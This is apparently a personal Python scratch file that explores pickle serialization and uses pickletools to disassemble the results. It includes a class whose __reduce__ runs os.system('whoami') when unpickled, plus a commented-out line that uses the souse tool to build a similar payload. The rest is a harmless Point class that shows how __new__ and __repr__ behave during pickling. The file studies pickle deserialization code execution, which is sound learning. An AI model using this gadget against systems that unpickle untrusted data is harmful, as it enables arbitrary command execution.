import pickle
import pickletools
import souse

# class test:
#     test = 1

class test:
    def __init__(self):
        self.test = 1

    def __reduce__(self):
        return (__import__('os').system, ('whoami',))

class Singleton:
    _instance = None

    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    # def __reduce__(self):
    #     return "Singleton"


Test = test()
# Test.__dict__['what'] = 2
# setattr(Test, 'why', 3)
ser_test = pickle.dumps(Test, protocol=3)
print(ser_test)
pickle.loads(ser_test)
pickletools.dis(pickletools.optimize(ser_test))

# singleton = Singleton()
# ser_single = pickle.dumps(singleton)
# pickletools.dis(pickletools.optimize(ser_single))

# sys_test = "from os import system\nsystem('whoami')"
# a = souse.API(sys_test, optimized=True).generate()
# print(pickletools.dis(a))

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y



    def __new__(cls, *args):
        print("__new()__  ->  " + repr(args))
        return super().__new__(cls)

    def __repr__(self):
        if getattr(self, 'z', None):
            print("self.z -> " + str(self.z))
        return f"Point({self.x}, {self.y})"

# 创建一个 Point 对象
p1 = Point(1, 2)
print(p1)  # 输出: Point(1, 2)

# 序列化对象
data = pickle.dumps(p1)
pickletools.dis(pickletools.optimize(data))
# print(pickletools.optimize(data))
# 反序列化对象
# p2 = pickle.loads(b'\x80\x04\x95#\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x05Point\x93)\x81}(\x8c\x01xK\x01\x8c\x01yK\x02\x8c\x01zK\x01ub.')
p2 = pickle.loads(data)
print(p2)  # 输出: Point(1, 2)

















